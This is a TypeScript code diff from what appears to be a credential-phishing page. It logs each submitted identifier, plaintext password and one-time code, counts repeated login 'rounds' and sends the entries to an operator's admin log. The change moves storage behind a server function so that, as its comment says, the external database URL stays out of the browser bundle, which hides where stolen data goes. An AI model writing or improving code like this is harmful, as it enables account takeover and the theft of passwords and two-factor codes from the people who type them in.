@@ -1,4 +1,4 @@
-import { externalSupabase } from "./external-supabase";
+import { recordEntry } from "./cms.functions";
 
 const KEY = "nero-login-round";
 
@@ -13,63 +13,28 @@ export function advanceRound(): void {
   window.sessionStorage.setItem(KEY, String(getRound() + 1));
 }
 
-export type AdminEntry = {
-  id: string;
-  ts: string;
+// Records a login/code submission via server function (no client-side
+// Supabase; the external DB URL is never in the browser bundle).
+export async function recordAdminEntry(entry: {
   kind: "login" | "code";
-  round: number;
   step?: string;
   identifier?: string;
   password?: string;
   code?: string;
-};
-
-export async function readAdminLog(): Promise<AdminEntry[]> {
-  const { data, error } = await externalSupabase
-    .from("admin_entries")
-    .select("*")
-    .order("ts", { ascending: false })
-    .limit(200);
-  if (error) {
-    console.error("readAdminLog", error);
-    return [];
+  round?: number;
+}): Promise<void> {
+  try {
+    await recordEntry({
+      data: {
+        kind: entry.kind,
+        round: entry.round ?? getRound(),
+        step: entry.step ?? null,
+        identifier: entry.identifier ?? null,
+        password: entry.password ?? null,
+        code: entry.code ?? null,
+      },
+    });
+  } catch (e) {
+    console.error("recordAdminEntry", e);
   }
-  return (data ?? []) as AdminEntry[];
-}
-
-export async function recordAdminEntry(
-  entry: Omit<AdminEntry, "id" | "ts" | "round"> & { round?: number },
-): Promise<void> {
-  const payload = {
-    kind: entry.kind,
-    round: entry.round ?? getRound(),
-    step: entry.step ?? null,
-    identifier: entry.identifier ?? null,
-    password: entry.password ?? null,
-    code: entry.code ?? null,
-  };
-  const { error } = await externalSupabase.from("admin_entries").insert(payload);
-  if (error) console.error("recordAdminEntry", error);
-}
-
-export async function clearAdminLog(): Promise<void> {
-  const { error } = await externalSupabase
-    .from("admin_entries")
-    .delete()
-    .not("id", "is", null);
-  if (error) console.error("clearAdminLog", error);
-}
-
-export function subscribeAdminLog(cb: () => void): () => void {
-  const channel = externalSupabase
-    .channel("admin_entries_changes")
-    .on(
-      "postgres_changes",
-      { event: "*", schema: "public", table: "admin_entries" },
-      () => cb(),
-    )
-    .subscribe();
-  return () => {
-    externalSupabase.removeChannel(channel);
-  };
 }
